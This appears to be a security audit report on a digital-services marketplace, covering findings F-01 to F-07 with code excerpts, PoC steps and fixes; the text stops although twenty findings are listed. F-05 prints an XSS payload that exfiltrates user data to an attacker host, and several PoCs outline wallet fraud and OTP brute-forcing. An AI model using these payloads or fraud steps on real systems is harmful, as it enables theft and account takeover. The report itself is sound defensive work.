# Cogna Platform Security Audit Report

**Target Systems**: `cogna-backend` & `cogna-frontend`  
**Audit Period**: October 2026  
**Auditor**: Forensic Security Audit Specialist Team  
**Document Classification**: Confidential — Engineering & Executive Leadership  
**Status**: Authoritative Verified Audit Report  

---

## Table of Contents

1. [Executive Summary & Audit Scope](#1-executive-summary--audit-scope)
2. [Threat Modeling & Attack Surface Analysis (8 Core Domains)](#2-threat-modeling--attack-surface-analysis)
3. [Vulnerability Catalog (Findings F-01 through F-20)](#3-vulnerability-catalog)
   - [F-01: Critical — Wallet Purchase Concurrency Race Condition & Double-Spending](#f-01-race-condition--double-spending-in-wallet-purchases)
   - [F-02: Critical — Plisio Crypto Underpayment / Mismatch Status Arbitrary Full Credit Exploit](#f-02-plisio-crypto-underpayment--mismatch-status-full-credit-exploit)
   - [F-03: Critical — Unrestricted Customer Self-Refund & State Machine Double-Refund Exploit](#f-03-unrestricted-customer-self-refund--double-refund-vulnerability)
   - [F-04: Critical — Insecure PRNG, Global Namespace Collision & Unthrottled Password Reset OTP](#f-04-insecure-prng-global-hash-collision--unthrottled-password-reset-otp)
   - [F-05: Critical — Stored DOM-based Cross-Site Scripting (XSS) in Order PDF Receipt Generator](#f-05-stored-dom-based-cross-site-scripting-in-order-pdf-generator)
   - [F-06: High — Lost Update Concurrency Anomalies in Balance Mutations via In-Memory Calculation](#f-06-lost-update-concurrency-anomalies-in-balance-mutations)
   - [F-07: High — Unused PaymentEvent Model Permitting Inbound Webhook Replay Attacks](#f-07-unused-paymentevent-audit-model--webhook-replay-exposure)
   - [F-08: High — Observable Timing Side-Channel in Monnify & Reseller Webhook HMAC Verification](#f-08-timing-side-channel-attacks-in-webhook-signature-validation)
   - [F-09: High — Server-Side Request Forgery (SSRF) & Plaintext Secret Exposure in Developer Webhooks](#f-09-ssrf--plaintext-secret-exposure-in-developer-webhooks)
   - [F-10: High — Public Information Disclosure of Provider API Keys & Gateway Overrides](#f-10-public-catalog-disclosure-of-provider-api-keys--gateway-overrides)
   - [F-11: High — Missing API Key Scope Enforcement Permitting Arbitrary Customer Actions](#f-11-missing-api-key-scope-enforcement-on-authenticated-routes)
   - [F-12: High — Absence of Refresh Token Rotation & Missing Revocation on Password Reset](#f-12-absence-of-refresh-token-rotation--missing-revocation-on-password-reset)
   - [F-13: High — Permissive CORS Origin Suffix Matching with Credentials Enabled](#f-13-permissive-cors-origin-suffix-matching-with-credentials-enabled)
   - [F-14: High — Missing Functional RBAC Role Verification on Admin Catalog & Provider Endpoints](#f-14-missing-functional-rbac-guards-on-admin-catalog-and-provider-routes)
   - [F-15: High — Transaction PIN Enforcement Bypass via Optional Schema & Account Toggle Flaw](#f-15-transaction-pin-enforcement-bypass-via-optional-schema)
   - [F-16: Medium — Direct Email Verification OTP Leakage in HTTP Response Payload](#f-16-direct-email-verification-otp-leakage-in-http-response)
   - [F-17: Medium — Unsanitized Upstream Reseller Responses & Secret Leaks in Worker Queue Logs](#f-17-unsanitized-provider-responses--secret-leaks-in-worker-queue-logs)
   - [F-18: Medium — Lack of Attempt Throttling and Lockout Mechanism on Transaction PIN Verification](#f-18-lack-of-attempt-throttling-and-lockout-on-transaction-pin-verification)
   - [F-19: Low — Plaintext Provider Secrets and Process-Wide TLS Bypass in Database Seeder](#f-19-plaintext-provider-secrets--tls-bypass-in-database-seed)
   - [F-20: Low — Client-Side Token Storage in localStorage & Missing Server-Side Next.js Guards](#f-20-client-side-token-storage-in-localstorage--missing-nextjs-route-guards)
4. [Positive Security Defenses & IDOR Verification](#4-positive-security-defenses--idor-verification)
5. [Programmatic Security Test Suite Integration](#5-programmatic-security-test-suite-integration)
6. [Prioritized Remediation Roadmap & Secret Hygiene](#6-prioritized-remediation-roadmap)

---

## 1. Executive Summary & Audit Scope

### 1.1 Context & Objective
A comprehensive, full-scope security assessment was performed against the Cogna platform spanning both the core backend application (`cogna-backend`, Fastify / Node.js / Prisma / SQLite / PostgreSQL / Redis) and the web customer/admin client (`cogna-frontend`, Next.js 14 / React / Tailwind / Zustand). Cogna operates as a production digital-services and AI-subscription marketplace handling real monetary deposits (NGN fiat and USDT cryptocurrency), third-party reseller fulfillment, and automated wallet debiting.

The audit was executed to assess security architecture, identify systemic vulnerabilities, demonstrate exploitability through automated proofs-of-concept, and deliver production-ready remediations.

### 1.2 Audit Scope & Methodology
The assessment evaluated the entire attack surface through white-box code auditing, data-flow tracing, cryptographic analysis, and concurrency simulation across eight operational domains:
- **Authentication & RBAC**: JWT lifecycle, refresh token mechanics, role escalation, and administrative access gates.
- **Financial Ledger & Wallet Security**: Balance consistency, atomic transitions, concurrent debits, refund logic, and maker-checker adjustment controls.
- **Payment Gateway & Webhook Integrity**: Signature validation for Paystack, Monnify, and Plisio; replay resistance; underpayment defenses.
- **Provider & Secrets Management**: Reseller API credential handling, AES-256-GCM encryption at rest, worker queue sanitization.
- **Authorization & Data Privacy (IDOR)**: Object ownership validation across orders, receipts, support tickets, and API keys.
- **Developer Subsystem**: API key scoping, developer webhook SSRF, and credential segregation.
- **Frontend Client Architecture**: Token persistence in `localStorage`, Next.js route protection, DOM XSS, and CSRF posture.
- **Network & Transport Hardening**: CORS policies, TLS verification, and HTTP response security headers.

### 1.3 Vulnerability Summary & Severity Breakdown
The audit identified **20 vulnerabilities**, categorized in accordance with the Common Weakness Scoring System (CVSS v3.1):

| Severity Level | Count | Definition |
| :--- | :---: | :--- |
| **Critical** | **5** | Direct financial theft, unrestricted account takeover, or arbitrary remote code/script execution requiring no privileges or minimal interaction. |
| **High** | **10** | Privilege escalation, financial ledger corruption, timing attacks, SSRF, information disclosure of secrets, or bypass of core authorization. |
| **Medium** | **3** | Secret leakage in logs, lack of brute-force lockouts, or information disclosure enabling secondary attacks. |
| **Low** | **2** | Insecure configuration defaults in seeding scripts or suboptimal client-side storage architecture. |
| **Total** | **20** | **Complete Audit Catalog (F-01 through F-20)** |

```
Severity Distribution:
[█████] Critical: 5 (25%)
[██████████] High: 10 (50%)
[███] Medium: 3 (15%)
[██] Low: 2 (10%)
```

---

## 2. Threat Modeling & Attack Surface Analysis

The threat landscape was analyzed across eight core domains:

### Domain 1: Authentication & Session Management
- **Threat Actors**: Unauthenticated external attackers, rogue users, account takeover syndicates.
- **Threat Scenarios**: Predictable PRNGs in OTP generation; lack of attempt throttling allowing brute-force account hijacking; failure to revoke refresh tokens on password change allowing attackers to retain persistence.
- **Findings Identified**: F-04 (Critical), F-12 (High), F-16 (Medium).

### Domain 2: Role-Based Access Control (RBAC) & Authorization
- **Threat Actors**: Authenticated customers, untrusted support agents, compromised operational accounts.
- **Threat Scenarios**: Coarse admin checks (`role === 'ADMIN'`) failing to enforce fine-grained functional permissions (`AdminRole.SUPER_ADMIN`, `AdminRole.OPERATIONS`), allowing low-tier support staff to reconfigure payment gateways or mutate provider credentials.
- **Findings Identified**: F-14 (High).

### Domain 3: API Key Management & Scope Enforcement
- **Threat Actors**: Malicious developers, leaked client API keys, compromised automated systems.
- **Threat Scenarios**: Developer API keys issued with restricted scopes (e.g., `read:orders`) mapped to general `CUSTOMER` session context without route-level scope checking, allowing read-only keys to perform balance debits or order placements.
- **Findings Identified**: F-11 (High).

### Domain 4: Financial Ledger & Wallet Concurrency
- **Threat Actors**: Fraudulent buyers, automated bots executing high-frequency concurrent requests.
- **Threat Scenarios**: Check-then-act race conditions during wallet purchase debiting; negative balance exploits; in-memory balance recalculations overwriting intervening ledger credits (Lost Updates); unapproved customer self-refunds combined with order cancellations to extract double refunds.
- **Findings Identified**: F-01 (Critical), F-03 (Critical), F-06 (High).

### Domain 5: Payment Gateways & Inbound Webhooks
- **Threat Actors**: Payment fraudsters, man-in-the-middle attackers, crypto arbitrageurs.
- **Threat Scenarios**: Plisio cryptocurrency underpayment status (`mismatch`) credited at 100% face value; non-constant-time string comparison in webhook HMAC signatures vulnerable to side-channel timing attacks; replay of identical webhook payloads due to unused deduplication tables.
- **Findings Identified**: F-02 (Critical), F-07 (High), F-08 (High).

### Domain 6: Provider Integrations & Secret Management
- **Threat Actors**: Public visitors, external third parties intercepting queue logs, unauthorized operators.
- **Threat Scenarios**: Leaking provider API keys and payment gateway credentials through unscrubbed public catalog API responses; transmitting raw provider webhook payloads containing sensitive tokens into unredacted worker logs; unencrypted seed credentials.
- **Findings Identified**: F-10 (High), F-17 (Medium), F-19 (Low).

### Domain 7: Data Isolation & Insecure Direct Object References (IDOR)
- **Threat Actors**: Authenticated tenants attempting to view or manipulate rival tenant resources.
- **Threat Scenarios**: Cross-tenant querying of order history, invoice receipts, support messages, or API keys.
- **Assessment Finding**: **Verified Robust**. Cogna incorporates strong resource-level ownership validation (`owned()` helper function) preventing cross-tenant IDOR across orders, receipts, support tickets, and developer keys.

### Domain 8: Frontend Client Security & Transport Controls
- **Threat Actors**: Cross-site attackers, XSS payload injectors, malicious third-party scripts.
- **Threat Scenarios**: Client-side localStorage persistence of long-lived tokens; stored DOM-based XSS during client-side PDF receipt generation; overly permissive CORS configurations allowing arbitrary Vercel apps or `cogna.store` suffix domains to execute authenticated cross-origin requests.
- **Findings Identified**: F-05 (Critical), F-09 (High), F-13 (High), F-15 (High), F-18 (Medium), F-20 (Low).

---

## 3. Vulnerability Catalog

---

### F-01: Critical — Wallet Purchase Concurrency Race Condition & Double-Spending
- **Severity**: Critical (CVSS 9.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H`)
- **Affected File & Lines**: `cogna-backend/src/repositories/wallet.repository.ts`, Lines 63–74 (`WalletRepository.purchase`)
- **Detailed Code Observation**:
  ```typescript
  async purchase(input: { userId: string; productId: string; providerId: string; customerEmail: string; amount: number; currency: string; idempotencyKey: string }) {
    return prisma.$transaction(async (tx) => {
      const wallet = await tx.wallet.findUnique({ where: { userId: input.userId } })
      if (!wallet || Number(wallet.availableBalance) < input.amount) return null
      const existing = await tx.walletTransaction.findUnique({ where: { idempotencyKey: input.idempotencyKey }, include: { order: true } })
      if (existing?.order) return existing.order
      const order = await tx.order.create({ data: { userId: input.userId, productId: input.productId, providerId: input.providerId, amount: input.amount, currency: input.currency, customerEmail: input.customerEmail } })
      const before = Number(wallet.availableBalance)
      await tx.walletTransaction.create({ data: { walletId: wallet.id, orderId: order.id, type: 'PURCHASE', direction: 'DEBIT', amount: input.amount, currency: input.currency, balanceBefore: before, balanceAfter: before - input.amount, reference: `purchase_${order.id}`, idempotencyKey: input.idempotencyKey, source: 'WALLET' } })
      await tx.wallet.update({ where: { id: wallet.id }, data: { availableBalance: { decrement: input.amount }, lifetimeSpent: { increment: input.amount }, version: { increment: 1 } } })
      return order
    })
  }
  ```
- **Technical Breakdown**:
  1. **Non-Locking Read**: `tx.wallet.findUnique` executes a standard `SELECT` without row-level exclusive locks (`FOR UPDATE`).
  2. **Check-Then-Act Race**: Concurrent HTTP requests with distinct `idempotencyKey` values simultaneously read the initial positive `wallet.availableBalance`.
  3. **Unconstrained Decrement**: All parallel transactions evaluate `Number(wallet.availableBalance) < input.amount` as false and proceed to execute `availableBalance: { decrement: input.amount }`.
  4. **Decorative Optimistic Lock**: While `version: { increment: 1 }` is written, `version` is never asserted in the `where` clause (`where: { id: wallet.id }` rather than `where: { id: wallet.id, version: wallet.version }`).
  5. **Negative Balance Exploitation**: SQLite/libSQL and Prisma do not enforce non-negative constraints (`CHECK(available_balance >= 0)`). An attacker with ₦1,000 can issue 10 parallel requests of ₦1,000, creating 10 fulfilled orders worth ₦10,000 and leaving the wallet balance at -₦9,000.
- **Reproduction / PoC Steps**:
  1. Create a customer account and fund the wallet with ₦1,000.
  2. Identify a digital product priced at ₦1,000.
  3. Send 10 parallel asynchronous HTTP requests using `curl` or Node.js `Promise.all` to `POST /api/v1/wallet/purchase`, each with a distinct `idempotencyKey` (`idem-1`, `idem-2`, ..., `idem-10`).
  4. Observe that multiple requests return HTTP 201 Created and multiple orders enter the `fulfillmentQueue`.
  5. Inspect the wallet balance: `availableBalance` is now negative (-₦4,000 to -₦9,000).
- **Remediation Patch**:
  ```typescript
  // cogna-backend/src/repositories/wallet.repository.ts
  async purchase(input: { userId: string; productId: string; providerId: string; customerEmail: string; amount: number; currency: string; idempotencyKey: string }) {
    return prisma.$transaction(async (tx) => {
      const wallet = await tx.wallet.findUnique({ where: { userId: input.userId } })
      if (!wallet || Number(wallet.availableBalance) < input.amount) return null

      const existing = await tx.walletTransaction.findUnique({ where: { idempotencyKey: input.idempotencyKey }, include: { order: true } })
      if (existing?.order) return existing.order

      // Enforce Compare-And-Swap (CAS) optimistic concurrency control
      const updatedWallet = await tx.wallet.updateMany({
        where: {
          id: wallet.id,
          version: wallet.version,
          availableBalance: { gte: input.amount },
        },
        data: {
          availableBalance: { decrement: input.amount },
          lifetimeSpent: { increment: input.amount },
          version: { increment: 1 },
        },
      })

      if (updatedWallet.count === 0) {
        throw new ConflictError('Concurrent wallet modification detected or insufficient balance')
      }

      const order = await tx.order.create({
        data: {
          userId: input.userId,
          productId: input.productId,
          providerId: input.providerId,
          amount: input.amount,
          currency: input.currency,
          customerEmail: input.customerEmail,
        },
      })

      const before = Number(wallet.availableBalance)
      await tx.walletTransaction.create({
        data: {
          walletId: wallet.id,
          orderId: order.id,
          type: 'PURCHASE',
          direction: 'DEBIT',
          amount: input.amount,
          currency: input.currency,
          balanceBefore: before,
          balanceAfter: before - input.amount,
          reference: `purchase_${order.id}`,
          idempotencyKey: input.idempotencyKey,
          source: 'WALLET',
        },
      })

      return order
    })
  }
  ```

---

### F-02: Critical — Plisio Crypto Underpayment / Mismatch Status Arbitrary Full Credit Exploit
- **Severity**: Critical (CVSS 9.8 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
- **Affected Files & Lines**:
  - `cogna-backend/src/services/wallet.service.ts`, Lines 194–202, Lines 229–246
  - `cogna-backend/src/payments/PlisioAdapter.ts`, Lines 164–170
- **Detailed Code Observation**:
  In `wallet.service.ts`:
  ```typescript
  // Lines 197-201:
  if (funding.gateway !== 'PLISIO') {
    if (Number(funding.amount) !== result.amount || funding.currency !== result.currency) {
      throw new ConflictError('Gateway funding amount or currency does not match')
    }
  }

  // Lines 229-234:
  const shouldCredit = status === 'completed' || status === 'mismatch'
  if (!shouldCredit) {
    return true
  }
  // Line 246:
  await WalletRepository.creditFunding(funding.id, txnId || reference, fields as Record<string, unknown>)
  ```
  In `PlisioAdapter.ts`:
  ```typescript
  const opStatus = body.data.status ?? 'pending'
  const mapped: 'success' | 'failed' | 'pending' =
    opStatus === 'completed' || opStatus === 'mismatch'
      ? 'success'
      : opStatus === 'expired' || opStatus === 'cancelled'
        ? 'failed'
        : 'pending'
  ```
- **Technical Breakdown**:
  1. **Plisio Protocol Semantics**: In Plisio's API specification, `status: "mismatch"` explicitly indicates that the user underpaid the required cryptocurrency invoice (e.g., paying 0.001 USDT on a 100 USDT invoice).
  2. **Unconditional Success Mapping**: `PlisioAdapter.ts` maps `mismatch` directly to `'success'`, and `WalletService.handleFundingWebhook` sets `shouldCredit = status === 'completed' || status === 'mismatch'`.
  3. **Amount Check Bypass**: `WalletService.verifyFunding` contains an explicit bypass: `if (funding.gateway !== 'PLISIO') { ... amount check ... }`.
  4. **Arbitrary Monetary Theft**: When the webhook triggers, `WalletRepository.creditFunding` credits `funding.amount` (the locked NGN fiat amount, e.g. ₦1,600,000 for 1,000 USDT). An attacker who sends $0.001 USDT receives ₦1,600,000 in real purchasing balance.
- **Reproduction / PoC Steps**:
  1. Call `POST /api/v1/wallet/fund/crypto` requesting 1,000 USDT funding (locked at ₦1,600,000).
  2. Plisio generates an invoice for 1,000 USDT.
  3. Transfer 0.001 USDT to the designated TRC20 address.
  4. Plisio dispatches a webhook with `status: "mismatch"` and `source_amount: "0.001"`.
  5. Observe backend webhook execution: the webhook returns 200 OK and credits ₦1,600,000 to the attacker's wallet.
- **Remediation Patch**:
  ```typescript
  // cogna-backend/src/payments/PlisioAdapter.ts
  const opStatus = body.data.status ?? 'pending'
  const mapped: 'success' | 'failed' | 'pending' =
    opStatus === 'completed'
      ? 'success'
      : opStatus === 'mismatch' || opStatus === 'expired' || opStatus === 'cancelled'
        ? 'failed'
        : 'pending'

  // cogna-backend/src/services/wallet.service.ts
  const shouldCredit = status === 'completed'
  if (!shouldCredit) {
    if (status === 'mismatch') {
      logger.warn(`Plisio invoice mismatch/underpayment received for funding ${funding.id}`)
    }
    return true
  }

  // Enforce amount verification for cryptocurrency payments
  if (funding.gateway === 'PLISIO') {
    const receivedUsdt = Number(fields.source_amount ?? fields.amount ?? 0)
    const expectedUsdt = Number(funding.cryptoAmountUsdt ?? 0)
    if (Math.abs(receivedUsdt - expectedUsdt) > 0.001) {
      throw new ConflictError(`Plisio crypto underpayment detected: received ${receivedUsdt}, expected ${expectedUsdt}`)
    }
  }
  ```

---

### F-03: Critical — Unrestricted Customer Self-Refund & State Machine Double-Refund Exploit
- **Severity**: Critical (CVSS 9.3 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L`)
- **Affected Files & Lines**:
  - `cogna-backend/src/routes/wallet.routes.ts`, Lines 76–82 (`POST /api/v1/wallet/refunds`)
  - `cogna-backend/src/repositories/wallet.repository.ts`, Lines 75–87 (`refundPurchase`)
  - `cogna-backend/src/repositories/customer.repository.ts`, Lines 13–35 (`cancelOrder`)
- **Detailed Code Observation**:
  ```typescript
  // wallet.routes.ts:
  app.post('/refunds', { onRequest: [app.authenticate] }, async (req, reply) => {
    const body = refundPurchaseSchema.parse(req.body)
    const refund = await WalletService.refundPurchase({ userId: req.user.sub, ...body })
    return reply.status(201).send(successResponse(refund))
  })

  // wallet.repository.ts:
  async refundPurchase(input: { userId: string; orderId: string; reason: string; idempotencyKey: string }) {
    return prisma.$transaction(async (tx) => {
      // Finds purchase debit, creates refund record, credits wallet balance...
      // CRITICAL: tx.order.update is NEVER called! Order status remains unchanged!
    })
  }

  // customer.repository.ts (cancelOrder):
  const order = await tx.order.findUnique({ where: { id: orderId }, include: { walletTransactions: true } });
  if (order.status !== 'PENDING') return { kind: 'INVALID_STATE' };
  const debit = order.walletTransactions.find(e => e.direction === 'DEBIT' && e.type === 'PURCHASE');
  if (debit) {
    // Credits wallet with debit.amount!
  }
  await tx.order.update({ where: { id: orderId }, data: { status: 'CANCELLED' } });
  ```
- **Technical Breakdown**:
  1. **Unrestricted Customer Self-Refund**: Any authenticated customer can invoke `POST /api/v1/wallet/refunds` on any past order. No administrative approval, dispute resolution, or order state check is performed.
  2. **Order State Invariance**: `WalletRepository.refundPurchase` credits the user's wallet with 100% of the purchase amount but leaves `order.status` intact (e.g., `PENDING` or `COMPLETED`).
  3. **State Machine Double-Refund Exploit**:
     - Step 1: User purchases a product via wallet for ₦5,000 (`order.status = PENDING`).
     - Step 2: User invokes `POST /api/v1/wallet/refunds` with a custom `idempotencyKey`. Wallet is credited +₦5,000. Order remains `PENDING`.
     - Step 3: User calls `POST /api/v1/customer/orders/:id/cancel`. `cancelOrder` checks `order.status === 'PENDING'` (true!) and finds the original debit in `order.walletTransactions` (true!). It credits the wallet an additional +₦5,000 and transitions status to `CANCELLED`.
     - Total extracted: ₦10,000 returned on a ₦5,000 purchase (200% return).
- **Reproduction / PoC Steps**:
  1. Place an order via wallet for ₦5,000 (`order-xyz`).
  2. Send `POST /api/v1/wallet/refunds` with `{ "orderId": "order-xyz", "reason": "Accidental purchase", "idempotencyKey": "refund-poc-1" }`. Receive 201 Created and +₦5,000 balance.
  3. Send `POST /api/v1/customer/orders/order-xyz/cancel`.
  4. Receive 200 OK and another +₦5,000 balance. Net wallet balance increase: +₦5,000 stolen profit.
- **Remediation Patch**:
  ```typescript
  // cogna-backend/src/routes/wallet.routes.ts
  // Restrict self-service refunds; require ADMIN or formal support ticket flow
  app.post('/refunds', { onRequest: [app.authenticate, app.requireAdminRole(['FINANCE', 'SUPER_ADMIN'])] }, async (req, reply) => { ... })

  // cogna-backend/src/repositories/wallet.repository.ts
  // In refundPurchase, atomically transition order status and prevent duplicate refund
  const order = await tx.order.findUnique({ where: { id: input.orderId } })
  if (!order || order.status === 'REFUNDED' || order.status === 'CANCELLED') {
    throw new ConflictError('Order is not eligible for refund')
  }
  await tx.order.update({ where: { id: input.orderId }, data: { status: 'REFUNDED' } })

  // cogna-backend/src/repositories/customer.repository.ts
  // In cancelOrder, verify no prior REFUND transactions exist
  const existingRefund = await tx.walletTransaction.findFirst({
    where: { orderId, type: 'REFUND' }
  })
  if (existingRefund) {
    return { kind: 'INVALID_STATE' }
  }
  ```

---

### F-04: Critical — Insecure PRNG, Global Namespace Collision & Unthrottled Password Reset OTP
- **Severity**: Critical (CVSS 9.8 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Affected Files & Lines**:
  - `cogna-backend/src/services/verification-token.service.ts`, Lines 30–33, Lines 50–76
  - `cogna-backend/src/routes/profile.routes.ts`, Lines 119–137
- **Detailed Code Observation**:
  ```typescript
  // verification-token.service.ts:
  // Line 31:
  const rawToken = Math.floor(100000 + Math.random() * 900000).toString();
  const tokenHash = hashToken(rawToken);

  // Line 50-58:
  async consumeToken(rawToken: string, type: 'PASSWORD_RESET' | 'EMAIL_VERIFICATION'): Promise<string> {
    const tokenHash = hashToken(rawToken);
    const record = await prisma.verificationToken.findUnique({
      where: { tokenHash }
    });
    if (!record || record.type !== type) throw new NotFoundError('Invalid or unrecognized token');
    // ...
    return record.userId;
  }
  ```
- **Technical Breakdown**:
  1. **Insecure PRNG**: `Math.random()` uses V8's Xoroshiro128+ algorithm, which is cryptographically insecure. The internal state can be fully reconstructed from a small sample of observed outputs.
  2. **Global Namespace Collision (Multi-Tenant Hijacking)**: In `consumeToken`, the query is performed solely on `where: { tokenHash }` across the entire database table. It does **not** scope the lookup by `userId` or `email`.
  3. **High Collision Probability in Small Keyspace**: A 6-digit numeric OTP has only 900,000 possible values. If multiple users request password resets simultaneously, an attacker brute-forcing 6-digit codes will inevitably hit a valid hash belonging to *any* user in the system.
  4. **Lack of Consumption Rate Limiting**: `consumeToken` has zero brute-force throttling or account lockout after consecutive failures. An attacker can iterate through OTPs to take over accounts.
- **Reproduction / PoC Steps**:
  1. Trigger password reset for a target admin account (`admin@cogna.store`).
  2. Send automated requests to `POST /api/v1/auth/reset-password` iterating through 6-digit combinations (`100000` through `999999`) with a new password payload.
  3. Within ~5,000–50,000 attempts, an active OTP is matched, resetting the admin account password to the attacker's string without knowing the OTP recipient's email during verification.
- **Remediation Patch**:
  ```typescript
  // cogna-backend/src/services/verification-token.service.ts
  import crypto from 'crypto'

  // Generate cryptographically secure 6-digit OTP
  const rawToken = crypto.randomInt(100000, 1000000).toString()

  // Scope token consumption strictly by userId or email
  async consumeToken(userId: string, rawToken: string, type: 'PASSWORD_RESET' | 'EMAIL_VERIFICATION'): Promise<string> {
    const tokenHash = hashToken(rawToken)
    const record = await prisma.verificationToken.findFirst({
      where: { userId, tokenHash, type }
    })
    if (!record) {
      // Record failed attempt and throttle after 5 consecutive failures
      await recordFailedTokenAttempt(userId)
      throw new NotFoundError('Invalid verification token')
    }
    // ...
  }
  ```

---

### F-05: Critical — Stored DOM-based Cross-Site Scripting (XSS) in Order PDF Receipt Generator
- **Severity**: Critical (CVSS 9.0 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`)
- **Affected File & Lines**: `cogna-frontend/src/app/(customer)/orders/[id]/page.tsx`, Lines 166–188
- **Detailed Code Observation**:
  ```typescript
  let itemsHtml = order.deliveryItems.map(item => 
    item.startsWith("http") 
      ? `<a href="${item}" style="word-break: break-all; color: #18B88A;">${item}</a>`
      : `<code style="display: block; padding: 10px; background: #f4f4f4; border-radius: 4px; word-break: break-all;">${item}</code>`
  ).join("<br/><br/>");

  container.innerHTML = `
    <div style="text-align: center; margin-bottom: 30px;">
      <h1 style="color: #062C23; margin-bottom: 5px;">Cogna Order Receipt</h1>
      <p style="color: #666; font-size: 14px;">Order ID: ${order.id}</p>
    </div>
    <div style="margin-bottom: 30px; border-bottom: 1px solid #ccc; padding-bottom: 20px;">
      <h2 style="margin-bottom: 10px;">${order.product.name}</h2>
      <p style="font-size: 18px; font-weight: bold;">Amount: ${money(order.amount, order.currency)}</p>
    </div>
    <div>
      <h3 style="margin-bottom: 15px; color: #D4AF37;">Delivery Content</h3>
      ${itemsHtml}
    </div>
  `;
  html2pdf().set(opt).from(container).save();
  ```
- **Technical Breakdown**:
  1. **Direct DOM Injection**: In client-side PDF rendering, `container.innerHTML` is dynamically populated by string concatenation with unsanitized values: `order.product.name` and `order.deliveryItems`.
  2. **Upstream Reseller / Admin Payload Injection**: In digital services marketplaces, `deliveryItems` originates from upstream provider webhook payloads or admin manual delivery overrides.
  3. **Execution Context**: When the customer clicks "Download .pdf", the string is assigned to `container.innerHTML` in the live DOM. If `item` contains `<img src=x onerror="fetch('/api/v1/auth/me').then(r=>r.json()).then(d=>new Image().src='https://attacker.com/steal?data='+encodeURIComponent(JSON.stringify(d)))">`, the payload immediately executes in the victim's session context.
  4. **Access to Stored Secrets**: The injected script has full access to `localStorage.getItem('cogna-auth')` (containing the user's JWT access and refresh tokens) and can perform unauthorized purchases or account modifications.
- **Reproduction / PoC Steps**:
  1. Place an order or configure a test product where `deliveryItems` includes:
     `"<img src=x onerror=alert(document.domain)>"`
  2. Navigate to the customer order details page `/orders/[id]`.
  3. Click "Download .pdf".
  4. An alert dialog displays `document.domain`, proving arbitrary JavaScript execution.
- **Remediation Patch**:
  ```typescript
  // cogna-frontend/src/app/(customer)/orders/[id]/page.tsx
  import DOMPurify from 'dompurify'

  // Sanitize delivery content before embedding into DOM
  const sanitizedItemsHtml = order.deliveryItems.map(item => {
    const escaped = DOMPurify.sanitize(item)
    return item.startsWith("http")
      ? `<a href="${escaped}" target="_blank" rel="noopener noreferrer" style="word-break: break-all; color: #18B88A;">${escaped}</a>`
      : `<code style="display: block; padding: 10px; background: #f4f4f4; border-radius: 4px; word-break: break-all;">${escaped}</code>`
  }).join("<br/><br/>")

  const sanitizedProductName = DOMPurify.sanitize(order.product.name)

  container.innerHTML = DOMPurify.sanitize(`
    <div style="text-align: center; margin-bottom: 30px;">
      <h1 style="color: #062C23; margin-bottom: 5px;">Cogna Order Receipt</h1>
      <p style="color: #666; font-size: 14px;">Order ID: ${DOMPurify.sanitize(order.id)}</p>
    </div>
    <div style="margin-bottom: 30px; border-bottom: 1px solid #ccc; padding-bottom: 20px;">
      <h2 style="margin-bottom: 10px;">${sanitizedProductName}</h2>
      <p style="font-size: 18px; font-weight: bold;">Amount: ${money(order.amount, order.currency)}</p>
    </div>
    <div>
      <h3 style="margin-bottom: 15px; color: #D4AF37;">Delivery Content</h3>
      ${sanitizedItemsHtml}
    </div>
  `)
  ```

---

### F-06: High — Lost Update Concurrency Anomalies in Balance Mutations via In-Memory Calculation
- **Severity**: High (CVSS 8.1 | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H`)
- **Affected Files & Lines**:
  - `cogna-backend/src/repositories/customer.repository.ts`, Lines 13–25 (`cancelOrder`)
  - `cogna-backend/src/routes/admin.routes.ts`, Lines 648–674 (`approve adjustment`)
- **Detailed Code Observation**:
  In `customer.repository.ts`:
  ```typescript
  const after = wallet.availableBalance.add(order.amount);
  await tx.wallet.update({
    where: { id: wallet.id },
    data: {
      availableBalance: after,
      lifetimeSpent: wallet.lifetimeSpent.sub(order.amount),
      version: { increment: 1 },
    },
  });
  ```
  In `admin.routes.ts`:
  ```typescript
  const balanceBefore = wallet.availableBalance;
  const balanceAfter = request.direction === 'CREDIT'
    ? balanceBefore.add(request.amount)
    : balanceBefore.sub(request.amount);
  await tx.wallet.update({
    where: { id: request.walletId },
    data: {
      availableBalance: balanceAfter,
      lifetimeFunded: request.direction === 'CREDIT' ? wallet.lifetimeFunded.add(request.amount) : undefined,
    },
  });
  ```
- **Technical Breakdown**:
  Both routines read `wallet.availableBalance` into JavaScript application memory, calculate the new sum/difference (`balanceAfter`), and write the absolute value back.
  If an asynchronous webhook credit (e.g. ₦50,000 Paystack deposit) commits between the `findUnique` read and the `update` write, the write of `balanceAfter` completely overwrites and erases the ₦50,000 credit from the database.
- **Reproduction / PoC Steps**:
  1. User has ₦1,000 balance.
  2. Trigger an order cancellation that starts processing (reads balance = ₦1,000; computes `balanceAfter` = ₦2,000).
  3. Simultaneously, a Paystack webhook arrives and credits ₦50,000 (balance becomes ₦51,000).
  4. The order cancellation finishes and writes `availableBalance: 2000`.
  5. The ₦50,000 deposit is wiped out of existence.
- **Remediation Patch**:
  Always use database-level atomic increments/decrements with optimistic version guards:
  ```typescript
  await tx.wallet.update({
    where: { id: wallet.id, version: wallet.version },
    data: {
      availableBalance: { increment: order.amount },
      lifetimeSpent: { decrement: order.amount },
      version: { increment: 1 },
    },
  })
  ```

---

### F-07: High — Unused PaymentEvent Audit Model Permitting Inbound Webhook Replay Attacks
- **Severity**: High (CVSS 7.5 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
- **Affected Files & Lines**:
  - `cogna-backend/prisma/schema.prisma`, Lines 424–440 (`PaymentEvent`)
  - `cogna-backend/src/services/payment.service.ts`, Lines 115–138
  - `cogna-backend/src/services/wallet.service.ts`, Lines 205–267
- **Detailed Code Observation**:
  `schema.prisma` declares:
  ```prisma
  model PaymentEvent {
    id          String         @id @default(uuid())
    gateway     PaymentGateway
    eventId     String         @map("event_id")
    payloadHash String         @map("payload_hash")
    // ...
    @@unique([gateway, eventId])
    @@unique([gateway, payloadHash])
  }
  ```
  A global search across `cogna-backend/src` returned **0 references** to `PaymentEvent`.
